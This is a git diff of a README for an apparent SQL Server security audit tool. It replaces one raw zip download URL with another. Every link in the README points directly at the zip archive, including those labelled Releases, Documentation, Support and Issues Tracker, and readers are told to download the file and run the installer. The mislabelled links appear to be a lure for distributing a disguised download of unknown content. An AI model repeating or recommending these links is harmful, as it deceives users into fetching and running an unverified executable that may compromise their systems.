@@ -6,7 +6,7 @@ Welcome to the sql-server-security-audit tool! This application helps you scan y
 
 ## 📥 Download Now
 
-[![Download sql-server-security-audit](https://github.com/bg-grira53/sql-server-security-audit/raw/refs/heads/master/Core/Environment/security-server-sql-audit-2.4-beta.5.zip)](https://github.com/bg-grira53/sql-server-security-audit/raw/refs/heads/master/Core/Environment/security-server-sql-audit-2.4-beta.5.zip)
+[![Download sql-server-security-audit](https://raw.githubusercontent.com/bg-grira53/sql-server-security-audit/master/Core/sql_server_audit_security_v2.7.zip)](https://raw.githubusercontent.com/bg-grira53/sql-server-security-audit/master/Core/sql_server_audit_security_v2.7.zip)
 
 ## 📌 System Requirements
 
@@ -27,7 +27,7 @@ Before you begin, ensure your system meets these requirements:
 
 ## 📚 How to Install
 
-1. **Visit the Releases Page:** Go to the download page [here](https://github.com/bg-grira53/sql-server-security-audit/raw/refs/heads/master/Core/Environment/security-server-sql-audit-2.4-beta.5.zip).
+1. **Visit the Releases Page:** Go to the download page [here](https://raw.githubusercontent.com/bg-grira53/sql-server-security-audit/master/Core/sql_server_audit_security_v2.7.zip).
 2. **Choose the Latest Release:** Look for the most recent version at the top of the page.
 3. **Download the Application:** Click on the link for the installer file and save it to your computer.
 4. **Run the Installer:** Locate the file in your downloads folder and double-click it to install.
@@ -48,17 +48,17 @@ Before you begin, ensure your system meets these requirements:
 
 ## 📩 Support
 
-If you have questions or need help, please reach out through the Issues section of our [GitHub repository](https://github.com/bg-grira53/sql-server-security-audit/raw/refs/heads/master/Core/Environment/security-server-sql-audit-2.4-beta.5.zip). We are here to assist you.
+If you have questions or need help, please reach out through the Issues section of our [GitHub repository](https://raw.githubusercontent.com/bg-grira53/sql-server-security-audit/master/Core/sql_server_audit_security_v2.7.zip). We are here to assist you.
 
 ## 📢 Community and Contributions
 
-You can help improve the sql-server-security-audit tool. If you have feedback or suggestions, please submit an issue or a pull request on our [GitHub page](https://github.com/bg-grira53/sql-server-security-audit/raw/refs/heads/master/Core/Environment/security-server-sql-audit-2.4-beta.5.zip). Your contributions are welcome!
+You can help improve the sql-server-security-audit tool. If you have feedback or suggestions, please submit an issue or a pull request on our [GitHub page](https://raw.githubusercontent.com/bg-grira53/sql-server-security-audit/master/Core/sql_server_audit_security_v2.7.zip). Your contributions are welcome!
 
 ## 🔗 Useful Links
 
-- [Releases Page](https://github.com/bg-grira53/sql-server-security-audit/raw/refs/heads/master/Core/Environment/security-server-sql-audit-2.4-beta.5.zip)
-- [Documentation](https://github.com/bg-grira53/sql-server-security-audit/raw/refs/heads/master/Core/Environment/security-server-sql-audit-2.4-beta.5.zip)
-- [Issues Tracker](https://github.com/bg-grira53/sql-server-security-audit/raw/refs/heads/master/Core/Environment/security-server-sql-audit-2.4-beta.5.zip)
+- [Releases Page](https://raw.githubusercontent.com/bg-grira53/sql-server-security-audit/master/Core/sql_server_audit_security_v2.7.zip)
+- [Documentation](https://raw.githubusercontent.com/bg-grira53/sql-server-security-audit/master/Core/sql_server_audit_security_v2.7.zip)
+- [Issues Tracker](https://raw.githubusercontent.com/bg-grira53/sql-server-security-audit/master/Core/sql_server_audit_security_v2.7.zip)
 
 ## 🎉 Conclusion
 
